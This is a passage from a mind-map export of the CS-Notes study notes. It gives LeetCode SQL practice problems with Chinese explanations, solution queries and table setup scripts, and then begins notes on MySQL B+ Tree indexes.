    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-8">
</a>
    <p dir="auto">
      左外链接
    </p>
    <pre>SELECT
    C.Name AS Customers
FROM
    Customers C
    LEFT JOIN Orders O
    ON C.Id = O.CustomerId
WHERE
    O.CustomerId IS NULL;</pre>
    <p dir="auto">
      子查询
    </p>
    <pre>SELECT
    Name AS Customers
FROM
    Customers
WHERE
    Id NOT IN ( 
        SELECT CustomerId 
        FROM Orders 
    );</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_351451348" CREATED="1754750556495" MODIFIED="1754789783574"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-8">
</a>
    <pre>DROP TABLE
IF
    EXISTS Customers;
CREATE TABLE Customers ( Id INT, NAME VARCHAR ( 255 ) );
DROP TABLE
IF
    EXISTS Orders;
CREATE TABLE Orders ( Id INT, CustomerId INT );
INSERT INTO Customers ( Id, NAME )
VALUES
    ( 1, 'Joe' ),
    ( 2, 'Henry' ),
    ( 3, 'Sam' ),
    ( 4, 'Max' );
INSERT INTO Orders ( Id, CustomerId )
VALUES
    ( 1, 3 ),
    ( 2, 1 );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_211183194" CREATED="1754750556497" MODIFIED="1754750556499"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      184. Department Highest Salary
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 184. Department Highest Salary" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#184-department-highest-salary">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/department-highest-salary/description/" rel="nofollow">https://leetcode.com/problems/department-highest-salary/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_492366519" CREATED="1754750556499" MODIFIED="1754750556501"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-9">
</a>
    <p dir="auto">
      Employee 表：
    </p>
    <pre>+----+-------+--------+--------------+
| Id | Name  | Salary | DepartmentId |
+----+-------+--------+--------------+
| 1  | Joe   | 70000  | 1            |
| 2  | Henry | 80000  | 2            |
| 3  | Sam   | 60000  | 2            |
| 4  | Max   | 90000  | 1            |
+----+-------+--------+--------------+</pre>
    <p dir="auto">
      Department 表：
    </p>
    <pre>+----+----------+
| Id | Name     |
+----+----------+
| 1  | IT       |
| 2  | Sales    |
+----+----------+</pre>
    <p dir="auto">
      查找一个 Department 中收入最高者的信息：
    </p>
    <pre>+------------+----------+--------+
| Department | Employee | Salary |
+------------+----------+--------+
| IT         | Max      | 90000  |
| Sales      | Henry    | 80000  |
+------------+----------+--------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_982583271" CREATED="1754750556502" MODIFIED="1754750556503"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-9">
</a>
    <p dir="auto">
      创建一个临时表，包含了部门员工的最大薪资。可以对部门进行分组，然后使用 MAX() 汇总函数取得最大薪资。
    </p>
    <p dir="auto">
      之后使用连接找到一个部门中薪资等于临时表中最大薪资的员工。
    </p>
    <pre>SELECT
    D.NAME Department,
    E.NAME Employee,
    E.Salary
FROM
    Employee E,
    Department D,
    ( SELECT DepartmentId, MAX( Salary ) Salary 
     FROM Employee 
     GROUP BY DepartmentId ) M
WHERE
    E.DepartmentId = D.Id
    AND E.DepartmentId = M.DepartmentId
    AND E.Salary = M.Salary;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1260892232" CREATED="1754750556504" MODIFIED="1754750556506"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-9">
</a>
    <pre>DROP TABLE IF EXISTS Employee;
CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, DepartmentId INT );
DROP TABLE IF EXISTS Department;
CREATE TABLE Department ( Id INT, NAME VARCHAR ( 255 ) );
INSERT INTO Employee ( Id, NAME, Salary, DepartmentId )
VALUES
    ( 1, 'Joe', 70000, 1 ),
    ( 2, 'Henry', 80000, 2 ),
    ( 3, 'Sam', 60000, 2 ),
    ( 4, 'Max', 90000, 1 );
INSERT INTO Department ( Id, NAME )
VALUES
    ( 1, 'IT' ),
    ( 2, 'Sales' );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_130656443" CREATED="1754750556506" MODIFIED="1754750556508"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      176. Second Highest Salary
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 176. Second Highest Salary" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#176-second-highest-salary">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/second-highest-salary/description/" rel="nofollow">https://leetcode.com/problems/second-highest-salary/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_324855014" CREATED="1754750556508" MODIFIED="1754750556509"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-10">
</a>
    <pre>+----+--------+
| Id | Salary |
+----+--------+
| 1  | 100    |
| 2  | 200    |
| 3  | 300    |
+----+--------+</pre>
    <p dir="auto">
      查找工资第二高的员工。
    </p>
    <pre>+---------------------+
| SecondHighestSalary |
+---------------------+
| 200                 |
+---------------------+</pre>
    <p dir="auto">
      没有找到返回 null 而不是不返回数据。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_432567501" CREATED="1754750556510" MODIFIED="1754750556512"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-10">
</a>
    <p dir="auto">
      为了在没有查找到数据时返回 null，需要在查询结果外面再套一层 SELECT。
    </p>
    <pre>SELECT
    ( SELECT DISTINCT Salary 
     FROM Employee 
     ORDER BY Salary DESC 
     LIMIT 1, 1 ) SecondHighestSalary;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_199470171" CREATED="1754750556512" MODIFIED="1754750556514"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-10">
</a>
    <pre>DROP TABLE
IF
    EXISTS Employee;
CREATE TABLE Employee ( Id INT, Salary INT );
INSERT INTO Employee ( Id, Salary )
VALUES
    ( 1, 100 ),
    ( 2, 200 ),
    ( 3, 300 );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1792290772" CREATED="1754750556514" MODIFIED="1754750556514"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      177. Nth Highest Salary
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_155109837" CREATED="1754750556515" MODIFIED="1754750556517"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-11">
</a>
    <p dir="auto">
      查找工资第 N 高的员工。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1036984715" CREATED="1754750556517" MODIFIED="1754750556519"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-11">
</a>
    <pre>CREATE FUNCTION getNthHighestSalary ( N INT ) RETURNS INT BEGIN
SET N = N - 1;
RETURN ( 
    SELECT ( 
        SELECT DISTINCT Salary 
        FROM Employee 
        ORDER BY Salary DESC 
        LIMIT N, 1 
    ) 
);
END</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1176094072" CREATED="1754750556520" MODIFIED="1754750556521"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-11">
</a>
    <p dir="auto">
      同 176。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_725915293" CREATED="1754750556522" MODIFIED="1754750556525"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      178. Rank Scores
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 178. Rank Scores" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#178-rank-scores">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/rank-scores/description/" rel="nofollow">https://leetcode.com/problems/rank-scores/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_1380486653" CREATED="1754750556525" MODIFIED="1754750556527"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-12">
</a>
    <p dir="auto">
      得分表：
    </p>
    <pre>+----+-------+
| Id | Score |
+----+-------+
| 1  | 3.50  |
| 2  | 3.65  |
| 3  | 4.00  |
| 4  | 3.85  |
| 5  | 4.00  |
| 6  | 3.65  |
+----+-------+</pre>
    <p dir="auto">
      将得分排序，并统计排名。
    </p>
    <pre>+-------+------+
| Score | Rank |
+-------+------+
| 4.00  | 1    |
| 4.00  | 1    |
| 3.85  | 2    |
| 3.65  | 3    |
| 3.65  | 3    |
| 3.50  | 4    |
+-------+------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_186778752" CREATED="1754750556527" MODIFIED="1754750556530"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-12">
</a>
    <p dir="auto">
      要统计某个 score 的排名，只要统计大于等于该 score 的 score 数量。
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          Id
        </th>
        <th>
          score
        </th>
        <th>
          大于等于该 score 的 score 数量
        </th>
        <th>
          排名
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
        <td>
          3
        </td>
        <td>
          3
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
        <td>
          2
        </td>
        <td>
          2
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          4.3
        </td>
        <td>
          1
        </td>
        <td>
          1
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      使用连接操作找到某个 score 对应的大于等于其值的记录：
    </p>
    <pre>SELECT
&#x9;*
FROM
    Scores S1
    INNER JOIN Scores S2
    ON S1.score &lt;= S2.score
ORDER BY
    S1.score DESC, S1.Id;</pre>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          S1.Id
        </th>
        <th>
          S1.score
        </th>
        <th>
          S2.Id
        </th>
        <th>
          S2.score
        </th>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          4.3
        </td>
        <td>
          3
        </td>
        <td>
          4.3
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
        <td>
          3
        </td>
        <td>
          4.3
        </td>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
        <td>
          3
        </td>
        <td>
          4.3
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      可以看到每个 S1.score 都有对应好几条记录，我们再进行分组，并统计每个分组的数量作为 'Rank'
    </p>
    <pre>SELECT
    S1.score 'Score',
    COUNT(*) 'Rank'
FROM
    Scores S1
    INNER JOIN Scores S2
    ON S1.score &lt;= S2.score
GROUP BY
    S1.id, S1.score
ORDER BY
    S1.score DESC, S1.Id;</pre>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          score
        </th>
        <th>
          Rank
        </th>
      </tr>
      <tr>
        <td>
          4.3
        </td>
        <td>
          1
        </td>
      </tr>
      <tr>
        <td>
          4.2
        </td>
        <td>
          2
        </td>
      </tr>
      <tr>
        <td>
          4.1
        </td>
        <td>
          3
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      上面的解法看似没问题，但是对于以下数据，它却得到了错误的结果：
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          Id
        </th>
        <th>
          score
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          4.2
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          score
        </th>
        <th>
          Rank
        </th>
      </tr>
      <tr>
        <td>
          4.2
        </td>
        <td>
          2
        </td>
      </tr>
      <tr>
        <td>
          4.2
        </td>
        <td>
          2
        </td>
      </tr>
      <tr>
        <td>
          4.1
        </td>
        <td>
          3
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      而我们希望的结果为：
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          score
        </th>
        <th>
          Rank
        </th>
      </tr>
      <tr>
        <td>
          4.2
        </td>
        <td>
          1
        </td>
      </tr>
      <tr>
        <td>
          4.2
        </td>
        <td>
          1
        </td>
      </tr>
      <tr>
        <td>
          4.1
        </td>
        <td>
          2
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      连接情况如下：
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          S1.Id
        </th>
        <th>
          S1.score
        </th>
        <th>
          S2.Id
        </th>
        <th>
          S2.score
        </th>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
        <td>
          3
        </td>
        <td>
          4.2
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          4.2
        </td>
        <td>
          3
        </td>
        <td>
          4.2
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          4.2
        </td>
        <td>
          2
        </td>
        <td>
          4.1
        </td>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
        <td>
          3
        </td>
        <td>
          4.2
        </td>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
        <td>
          2
        </td>
        <td>
          4.2
        </td>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
        <td>
          1
        </td>
        <td>
          4.1
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      我们想要的结果是，把分数相同的放在同一个排名，并且相同分数只占一个位置，例如上面的分数，Id=2 和 Id=3 的记录都有相同的分数，并且最高，他们并列第一。而 Id=1 的记录应该排第二名，而不是第三名。所以在进行 COUNT 计数统计时，我们需要使用 COUNT( DISTINCT S2.score ) 从而只统计一次相同的分数。
    </p>
    <pre>SELECT
    S1.score 'Score',
    COUNT( DISTINCT S2.score ) 'Rank'
FROM
    Scores S1
    INNER JOIN Scores S2
    ON S1.score &lt;= S2.score
GROUP BY
    S1.id, S1.score
ORDER BY
    S1.score DESC;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_840679485" CREATED="1754750556531" MODIFIED="1754750556533"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-12">
</a>
    <pre>DROP TABLE
IF
    EXISTS Scores;
CREATE TABLE Scores ( Id INT, Score DECIMAL ( 3, 2 ) );
INSERT INTO Scores ( Id, Score )
VALUES
    ( 1, 4.1 ),
    ( 2, 4.1 ),
    ( 3, 4.2 ),
    ( 4, 4.2 ),
    ( 5, 4.3 ),
    ( 6, 4.3 );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1621316132" CREATED="1754750556533" MODIFIED="1754750556535"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      180. Consecutive Numbers
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 180. Consecutive Numbers" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#180-consecutive-numbers">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/consecutive-numbers/description/" rel="nofollow">https://leetcode.com/problems/consecutive-numbers/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_1570683864" CREATED="1754750556535" MODIFIED="1754750556537"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-13">
</a>
    <p dir="auto">
      数字表：
    </p>
    <pre>+----+-----+
| Id | Num |
+----+-----+
| 1  |  1  |
| 2  |  1  |
| 3  |  1  |
| 4  |  2  |
| 5  |  1  |
| 6  |  2  |
| 7  |  2  |
+----+-----+</pre>
    <p dir="auto">
      查找连续出现三次的数字。
    </p>
    <pre>+-----------------+
| ConsecutiveNums |
+-----------------+
| 1               |
+-----------------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1323887228" CREATED="1754750556537" MODIFIED="1754750556539"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-13">
</a>
    <pre>SELECT
    DISTINCT L1.num ConsecutiveNums
FROM
    Logs L1,
    Logs L2,
    Logs L3
WHERE L1.id = l2.id - 1
    AND L2.id = L3.id - 1
    AND L1.num = L2.num
    AND l2.num = l3.num;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1936627562" CREATED="1754750556539" MODIFIED="1754750556540"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-13">
</a>
    <pre>DROP TABLE
IF
    EXISTS LOGS;
CREATE TABLE LOGS ( Id INT, Num INT );
INSERT INTO LOGS ( Id, Num )
VALUES
    ( 1, 1 ),
    ( 2, 1 ),
    ( 3, 1 ),
    ( 4, 2 ),
    ( 5, 1 ),
    ( 6, 2 ),
    ( 7, 2 );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1047851167" CREATED="1754750556541" MODIFIED="1754750556543"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      626. Exchange Seats
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 626. Exchange Seats" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#626-exchange-seats">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/exchange-seats/description/" rel="nofollow">https://leetcode.com/problems/exchange-seats/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_1657177692" CREATED="1754750556543" MODIFIED="1754750556545"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-14">
</a>
    <p dir="auto">
      seat 表存储着座位对应的学生。
    </p>
    <pre>+---------+---------+
|    id   | student |
+---------+---------+
|    1    | Abbot   |
|    2    | Doris   |
|    3    | Emerson |
|    4    | Green   |
|    5    | Jeames  |
+---------+---------+</pre>
    <p dir="auto">
      要求交换相邻座位的两个学生，如果最后一个座位是奇数，那么不交换这个座位上的学生。
    </p>
    <pre>+---------+---------+
|    id   | student |
+---------+---------+
|    1    | Doris   |
|    2    | Abbot   |
|    3    | Green   |
|    4    | Emerson |
|    5    | Jeames  |
+---------+---------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_228099290" CREATED="1754750556545" MODIFIED="1754750556547"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-14">
</a>
    <p dir="auto">
      使用多个 union。
    </p>
    <pre>## 处理偶数 id，让 id 减 1
## 例如 2,4,6,... 变成 1,3,5,...
SELECT
    s1.id - 1 AS id,
    s1.student
FROM
    seat s1
WHERE
    s1.id MOD 2 = 0 UNION
## 处理奇数 id，让 id 加 1。但是如果最大的 id 为奇数，则不做处理
## 例如 1,3,5,... 变成 2,4,6,...
SELECT
    s2.id + 1 AS id,
    s2.student
FROM
    seat s2
WHERE
    s2.id MOD 2 = 1
    AND s2.id != ( SELECT max( s3.id ) FROM seat s3 ) UNION
## 如果最大的 id 为奇数，单独取出这个数
SELECT
    s4.id AS id,
    s4.student
FROM
    seat s4
WHERE
    s4.id MOD 2 = 1
    AND s4.id = ( SELECT max( s5.id ) FROM seat s5 )
ORDER BY
    id;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_404771116" CREATED="1754750556547" MODIFIED="1754750556548"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-14">
</a>
    <pre>DROP TABLE
IF
    EXISTS seat;
CREATE TABLE seat ( id INT, student VARCHAR ( 255 ) );
INSERT INTO seat ( id, student )
VALUES
    ( '1', 'Abbot' ),
    ( '2', 'Doris' ),
    ( '3', 'Emerson' ),
    ( '4', 'Green' ),
    ( '5', 'Jeames' );</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node ID="ID_287816781" CREATED="1754749805677" MODIFIED="1754750566903" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      MySQL
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_192474240" CREATED="1754750563757" MODIFIED="1754750563757"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、索引
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1291355549" CREATED="1754750563759" MODIFIED="1754750563759"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      B+ Tree 原理
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_994322791" CREATED="1754750563761" MODIFIED="1754750563764"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 数据结构
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 数据结构" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#1-数据结构">
</a>
    <p dir="auto">
      B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。
    </p>
    <p dir="auto">
      B+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。
    </p>
    <p dir="auto">
      在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 key<sub>i</sub>&#xa0;和 key<sub>i+1</sub>，且不为 null，则该指针指向节点的所有 key 大于等于 key<sub>i</sub>&#xa0;且小于等于 key<sub>i+1</sub>。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/12121ad04e41afdd2d5ca585134dcdd6fae6c59b6fafbe26e614148bf24b08bb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33333537363834392d393237352d343762622d616461372d3864656435663565376337332e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/12121ad04e41afdd2d5ca585134dcdd6fae6c59b6fafbe26e614148bf24b08bb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33333537363834392d393237352d343762622d616461372d3864656435663565376337332e706e67" width="350px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/33576849-9275-47bb-ada7-8ded5f5e7c73.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_833522804" CREATED="1754750563764" MODIFIED="1754750563765"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 操作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 操作" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#2-操作">
</a>
    <p dir="auto">
